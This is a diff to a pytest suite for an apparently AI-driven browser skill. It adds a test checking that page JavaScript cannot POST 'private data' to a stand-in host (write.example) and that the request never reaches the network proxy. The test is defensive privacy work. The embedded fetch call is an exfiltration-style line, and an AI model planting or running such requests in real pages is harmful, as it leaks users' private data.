@@ -5,6 +5,7 @@ import json
 
 import pytest
 import pytest_asyncio
+from unittest.mock import AsyncMock
 
 from blob.privacy.controls import PrivacyControls
 from blob.skills.builtin.browser import BrowserSkill
@@ -63,6 +64,21 @@ async def test_browser_blocks_password_fields_and_transactions(browser):
     buy = await browser.async_execute({"action": "click", "ref": ref(result, "Buy now")})
     assert not buy.success and "transactions" in buy.output
     assert await browser._page.locator('[type=password]').input_value() == ""
+
+
+@pytest.mark.asyncio
+async def test_page_cannot_submit_a_disguised_write_request(browser, monkeypatch):
+    import blob.skills.web_network as network
+    result = await browser.async_execute({"action": "open", "url": "https://lookup.example/"})
+    assert result.success
+    resolve = AsyncMock(side_effect=AssertionError("A blocked write reached the network proxy"))
+    monkeypatch.setattr(network, "public_addresses", resolve)
+    success = await browser._page.evaluate("""async () => {
+        try { await fetch('https://write.example/submit', {method:'POST', body:'private data'}); return true; }
+        catch { return false; }
+    }""")
+    assert not success
+    resolve.assert_not_awaited()
 
 
 @pytest.mark.asyncio
